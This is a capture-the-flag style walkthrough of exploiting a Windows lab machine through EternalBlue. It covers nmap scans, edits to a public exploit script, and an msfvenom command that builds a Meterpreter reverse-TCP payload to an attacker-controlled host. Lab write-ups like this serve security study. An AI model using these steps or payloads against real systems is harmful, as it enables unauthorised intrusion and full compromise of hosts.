## Reconnaissance

The first step was a full port scan against the target to identify the exposed services, run with default scripts and service-version detection.

```bash
nmap -Pn -sV -sC -p- --open 10.10.10.40 -oN scan.txt
```

The results show a Windows Server with SMB available. Anonymous access to the SMB service returns nothing useful. To assess known issues, a second scan is run with the vulnerability scripts.

```bash
nmap -Pn -sV -sC -p- --open 10.10.10.40 --script vuln
```

This confirms that the SMB service is vulnerable to the well-known EternalBlue flaw.

![EternalBlue detected by the vuln scripts](/assets/images/blue/25-1.png)

## Enumeration / Analysis

Running the public EternalBlue exploit script raises an error about a missing named pipe, which points to a privilege-related problem in how the script connects. To work around it, the script is reviewed and edited; the first change explicitly defines the user inside the script so it authenticates correctly.

![Exploit script reviewed and edited](/assets/images/blue/25-2.png)
*Adjusting the user defined inside the exploit script*

Reading further shows that, as written, the script only drops a file on the target and never returns an interactive shell.

![Script only creates a file](/assets/images/blue/25-3.png)
*The unmodified script merely writes a file to the target*

## Exploitation

To get an interactive session, a reverse-shell payload is generated with msfvenom, configured for a Meterpreter reverse TCP connection.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe
```

The exploit script is then edited to uncomment the relevant section and point it at the full path of the generated executable. Running the modified script returns a working reverse shell. The same result can be achieved directly through Metasploit with msfconsole.

![Reverse shell from the modified script](/assets/images/blue/25-4.png)
*Reverse shell obtained after editing the script*

## Privilege Escalation

Because of how EternalBlue works, successful exploitation already runs in an administrative context, so the system is fully compromised without any further escalation.
